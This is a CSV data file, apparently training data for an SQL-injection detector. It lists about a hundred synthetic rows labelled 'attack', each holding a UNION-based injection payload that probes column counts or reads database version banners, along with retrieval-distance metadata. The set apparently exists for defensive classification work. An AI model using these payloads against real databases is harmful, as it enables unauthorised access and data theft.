id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000396,attack,union,"-8684 union all select 9519,9519,9519,9519--",nearest_attack_euclidean,R001004,0.381584133177086
SMOTE_000397,attack,union,"-7371'  )   union all select 4531,4531,4531#",nearest_attack_euclidean,R000217,0.062236071752817874
SMOTE_000398,attack,union,"-3719"" union all select 6609,6609,6609,6609#",nearest_attack_euclidean,R000712,0.20930530551494286
SMOTE_000399,attack,union,"1   )    )    as cvid where 4381  =  4381 union all select null,null--",nearest_attack_euclidean,R001429,0.3702332645556709
SMOTE_000400,attack,union," select * from users where id  =  1 union select 1 1$,version  (    )   -- 1",nearest_attack_euclidean,R000151,0.02987393833035039
SMOTE_000401,attack,union,"1'||  (  select 'vixv' from dual where 7704  =  7704 union all select null,null,null,null,null--",nearest_attack_euclidean,R000655,0.2896310744690128
SMOTE_000402,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000772,0.2840533649090306
SMOTE_000403,attack,union,"-9596  )   where 3425  =  3425 union all select 3425,3425,3425,3425,3425,3425#",nearest_attack_euclidean,R000401,0.13775231633157387
SMOTE_000404,attack,union,-2452'   )    )     )   union all select 1951--,nearest_attack_euclidean,R000515,0.12547315695495018
SMOTE_000405,attack,union,"-2929""   )    )     )   union all select 8999,8999#",nearest_attack_euclidean,R000446,0.3265628715008928
SMOTE_000406,attack,union,"-4317""   )    )    as nxvn where 2566  =  2566 union all select 2566,2566,2566#",nearest_attack_euclidean,R001544,0.24433737588053767
SMOTE_000407,attack,union,"-3102  )   union all select 6707,6707,6707,6707--",nearest_attack_euclidean,R001084,0.04133569101696975
SMOTE_000408,attack,union,"1%""   )    )    union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000409,0.13634192274823312
SMOTE_000409,attack,union,"1%""   )    )    union all select null,null,null,null--",nearest_attack_euclidean,R000323,0.03946474900787796
SMOTE_000410,attack,union,"1%' union all select null,null,null,null--",nearest_attack_euclidean,R000683,0.09691913663167555
SMOTE_000411,attack,union," select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000016,0.28951015361417104
SMOTE_000412,attack,union,"-1106'   )    )    union all select 2855,2855,2855,2855,2855,2855,2855#",nearest_attack_euclidean,R000930,0.010787824470382942
SMOTE_000413,attack,union,"-3282'  )   union all select 9002,9002,9002,9002,9002#",nearest_attack_euclidean,R001454,0.16414539963384678
SMOTE_000414,attack,union,"-1526""  )   where 4870  =  4870 union all select 4870,4870,4870,4870,4870,4870,4870,4870,4870,4870#",nearest_attack_euclidean,R001524,0.03849125947072201
SMOTE_000415,attack,union,"-4280%""   )    )     )   union all select 7981,7981--",nearest_attack_euclidean,R000776,0.38979121762944874
SMOTE_000416,attack,union,"-2790'  )   as xhct where 5756  =  5756 union all select 5756,5756#",nearest_attack_euclidean,R001269,0.020113676729436914
SMOTE_000417,attack,union,"-8294%' union all select 8728,8728,8728,8728,8728,8728,8728,8728,8728,8728#",nearest_attack_euclidean,R001267,0.3577816437323317
SMOTE_000418,attack,union," select * from users where id  =  1 union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000088,0.516762018185448
SMOTE_000419,attack,union,"1'||  (  select 'xhqy' where 4531  =  4531 union all select null,null--",nearest_attack_euclidean,R000488,0.21177912157156145
SMOTE_000420,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R001622,0.7326312023856112
SMOTE_000421,attack,union,"1'||  (  select 'ybfo' from dual where 3319  =  3319 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000947,0.4522823185657587
SMOTE_000422,attack,union,"-3104"" union all select 5717,5717,5717,5717,5717,5717,5717,5717,5717--",nearest_attack_euclidean,R000373,0.03553203536078861
SMOTE_000423,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001292,0.15250806828339453
SMOTE_000424,attack,union,"-2190'  )   where 8890  =  8890 union all select 8890,8890#",nearest_attack_euclidean,R001651,0.35103560644755355
SMOTE_000425,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R001208,0.35610419837556395
SMOTE_000426,attack,union,"-6357""  )   union all select 9767,9767,9767,9767,9767,9767,9767,9767,9767#",nearest_attack_euclidean,R001206,0.05064581288124511
SMOTE_000427,attack,union,"1'  )   as ybuv where 9641  =  9641 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000611,0.4787843168147412
SMOTE_000428,attack,union,"-7371'  )   union all select 4531,4531,4531#",nearest_attack_euclidean,R000217,0.07226477614886086
SMOTE_000429,attack,union," select * from users where id  =  1 or @#"",  =  1 union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000050,0.15364224030399445
SMOTE_000430,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000353,0.09204311227821746
SMOTE_000431,attack,union,"-6775"" union all select 7484,7484#",nearest_attack_euclidean,R001304,0.19975887790831262
SMOTE_000432,attack,union,"1""  )   where 3084  =  3084 union all select null,null--",nearest_attack_euclidean,R001253,0.2758277044886551
SMOTE_000433,attack,union,"1"" where 4808  =  4808 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000261,0.05064042807729757
SMOTE_000434,attack,union,"-8661"" union all select 5731,5731--",nearest_attack_euclidean,R001630,0.2545107670233878
SMOTE_000435,attack,union,"-9932"" union all select 4049,4049,4049--",nearest_attack_euclidean,R000917,0.11197608800218556
SMOTE_000436,attack,union,"1%'   )    )    union all select null,null--",nearest_attack_euclidean,R001609,0.46393297533115363
SMOTE_000437,attack,union,"-9003""   )    )    union all select 9721,9721--",nearest_attack_euclidean,R001375,0.11957730239171546
SMOTE_000438,attack,union,"1%' union all select null,null,null,null,null--",nearest_attack_euclidean,R000573,0.006076632806798168
SMOTE_000439,attack,union," select * from users where id  =  '1' + @ 1! union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000194,0.09861528271611363
SMOTE_000440,attack,union," select * from users where id  =  1 +   (  \+  )   union select null,@@VERSION -- 1",nearest_attack_euclidean,R000118,1.1920928955078125e-07
SMOTE_000441,attack,union,"1 where 2292  =  2292 union all select null,null,null,null#",nearest_attack_euclidean,R000951,0.6029476833708571
SMOTE_000442,attack,union,"1%"" union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000698,0.06126288703865094
SMOTE_000443,attack,union,"-9078 union all select 3779,3779,3779,3779,3779,3779,3779,3779--",nearest_attack_euclidean,R001197,0.18599502388541
SMOTE_000444,attack,union,"-4031%"" union all select 9566--",nearest_attack_euclidean,R000320,0.21264779936987363
SMOTE_000445,attack,union,"-8419  )   where 8692  =  8692 union all select 8692,8692,8692--",nearest_attack_euclidean,R000994,0.27145854400026576
SMOTE_000446,attack,union,"1'   )    )    as orvy where 7270  =  7270 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000636,0.23740152468525283
SMOTE_000447,attack,union," select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000013,0.5552292417106359
SMOTE_000448,attack,union," select * from users where id  =  1 or $ 1  =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000174,0.3646434473179242
SMOTE_000449,attack,union,"-7531'   )    )     )   union all select 6900,6900,6900,6900,6900,6900,6900,6900,6900#",nearest_attack_euclidean,R001134,0.4328231995784975
SMOTE_000450,attack,union,"1   )    )    union all select null,null--",nearest_attack_euclidean,R001590,0.249633302954224
SMOTE_000451,attack,union,"1   )    )     )   union all select null,null--",nearest_attack_euclidean,R001539,0.3585848090147396
SMOTE_000452,attack,union,"-7138"" union all select 2341,2341,2341,2341--",nearest_attack_euclidean,R001291,0.3922315575842316
SMOTE_000453,attack,union," select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000033,0.0436469521509242
SMOTE_000454,attack,union,"-1681%"" union all select 8180,8180,8180,8180,8180,8180,8180,8180,8180,8180#",nearest_attack_euclidean,R000265,0.18968178151945952
SMOTE_000455,attack,union,"1'  )   where 6328  =  6328 union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R001433,0.06710164872067773
SMOTE_000456,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000805,0.05978360471794991
SMOTE_000457,attack,union,"-2225' union all select 1545,1545,1545,1545#",nearest_attack_euclidean,R000335,0.15967485061026898
SMOTE_000458,attack,union,"-1630' union all select 1971,1971--",nearest_attack_euclidean,R001449,0.06755993048222358
SMOTE_000459,attack,union,"-4413%'   )    )    union all select 1345,1345#",nearest_attack_euclidean,R001438,0.4111028069269353
SMOTE_000460,attack,union,"1' where 7688  =  7688 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000803,0.12097029627358982
SMOTE_000461,attack,union,"1   )    )     )   union all select null,null,null#",nearest_attack_euclidean,R001246,0.37486237492986724
SMOTE_000462,attack,union," select * from users where id  =  1 +1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000091,0.04151489803901174
SMOTE_000463,attack,union,"1'   )    )    as lrnh where 8569  =  8569 union all select null,null,null,null,null--",nearest_attack_euclidean,R000970,0.03222220863191335
SMOTE_000464,attack,union,"1""   )    )     )   union all select null,null,null--",nearest_attack_euclidean,R001191,0.615144194469414
SMOTE_000465,attack,union," select * from users where id  =  1 + @`\` union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000170,0.2903667744415084
SMOTE_000466,attack,union," select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000023,0.2168338558618718
SMOTE_000467,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R001597,0.35989626656388796
SMOTE_000468,attack,union,"-4798%'   )    )     )   union all select 3330,3330,3330#",nearest_attack_euclidean,R000731,0.4038929266283412
SMOTE_000469,attack,union,"-1998'  )   as kgvf where 2346  =  2346 union all select 2346,2346,2346,2346,2346,2346,2346,2346,2346--",nearest_attack_euclidean,R000399,0.02287340879149125
SMOTE_000470,attack,union,"1' where 3760  =  3760 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R001168,0.167235529686145
SMOTE_000471,attack,union,"-8364'  )   union all select 4732,4732,4732,4732,4732,4732,4732,4732,4732#",nearest_attack_euclidean,R000394,0.0
SMOTE_000472,attack,union,"-8661"" union all select 5731,5731--",nearest_attack_euclidean,R001630,0.3293707499673855
SMOTE_000473,attack,union,"1   )    )    union all select null,null,null,null--",nearest_attack_euclidean,R000514,0.1758342473988341
SMOTE_000474,attack,union,"-6007""   )    )    union all select 6019,6019,6019,6019,6019,6019,6019,6019--",nearest_attack_euclidean,R000448,0.15585261572427514
SMOTE_000475,attack,union,"1' where 8451  =  8451 union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R001091,0.21606117598788957
SMOTE_000476,attack,union,"1""  )   union all select null,null,null--",nearest_attack_euclidean,R001578,0.18429187406590547
SMOTE_000477,attack,union,"-5998""  )   as gazd where 2814  =  2814 union all select 2814,2814,2814,2814,2814,2814,2814--",nearest_attack_euclidean,R001471,0.4375759150276345
SMOTE_000478,attack,union,1'   )    )    as wuws where 6917  =  6917 union all select null#,nearest_attack_euclidean,R000660,0.44069075799868435
SMOTE_000479,attack,union,"1' union all select null,null#",nearest_attack_euclidean,R000381,1.080551049337877
SMOTE_000480,attack,union,"-7725%'   )    )    union all select 4559,4559,4559,4559,4559,4559,4559,4559,4559--",nearest_attack_euclidean,R001666,0.32935696697047556
SMOTE_000481,attack,union," select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000024,1.4551303290312696
SMOTE_000482,attack,union,"-6220' union all select 1462,1462#",nearest_attack_euclidean,R000443,8.717370336835686e-06
SMOTE_000483,attack,union,"-4230""   )    )     )   union all select 6962,6962,6962,6962,6962,6962#",nearest_attack_euclidean,R001103,0.2040285154608002
SMOTE_000484,attack,union,"-8933  )   as iiyr where 1974  =  1974 union all select 1974,1974,1974,1974,1974#",nearest_attack_euclidean,R001569,0.26212853230100014
SMOTE_000485,attack,union,"-8364'  )   union all select 4732,4732,4732,4732,4732,4732,4732,4732,4732#",nearest_attack_euclidean,R000394,0.0
SMOTE_000486,attack,union,"-5524  )   as eoyk where 6928  =  6928 union all select 6928,6928,6928,6928,6928,6928,6928,6928,6928--",nearest_attack_euclidean,R000370,0.593250237324681
SMOTE_000487,attack,union," select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000049,0.0
SMOTE_000488,attack,union,"-6200' where 9150  =  9150 union all select 9150,9150,9150,9150,9150,9150,9150#",nearest_attack_euclidean,R000710,0.5159049348321779
SMOTE_000489,attack,union," select * from users where id  =  '1' +   (  \  )   union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000173,0.21293165860270968
SMOTE_000490,attack,union,"-1573""  )   union all select 3928,3928,3928,3928--",nearest_attack_euclidean,R000679,0.27518041141799626
SMOTE_000491,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000454,0.15862037328389458
SMOTE_000492,attack,union,"1  )   as wokl where 1368  =  1368 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000974,0.20366541876048452
SMOTE_000493,attack,union," select * from users where id  =  '1' union select \,@@VERSION -- 1'",nearest_attack_euclidean,R000055,0.19772853466799023
SMOTE_000494,attack,union,"-6883""  )   as tbai where 8121  =  8121 union all select 8121,8121,8121,8121,8121,8121,8121,8121--",nearest_attack_euclidean,R000531,0.22810912750891113
SMOTE_000495,attack,union," select * from users where id  =  11||1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000106,2.0448070983483695
SMOTE_000496,attack,union,"1' union all select null,null#",nearest_attack_euclidean,R000381,0.9550233566117001
SMOTE_000497,attack,union,"1   )    )    union all select null,null,null,null--",nearest_attack_euclidean,R000514,0.24698886272801374
SMOTE_000498,attack,union,"-4772   )    )     )   union all select 3879,3879,3879,3879,3879--",nearest_attack_euclidean,R000447,0.31917510613541
SMOTE_000499,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R001620,0.07961939116256915
SMOTE_000500,attack,union,"-2899""   )    )    as uyoc where 8417  =  8417 union all select 8417,8417,8417,8417--",nearest_attack_euclidean,R001215,0.04555778116504099
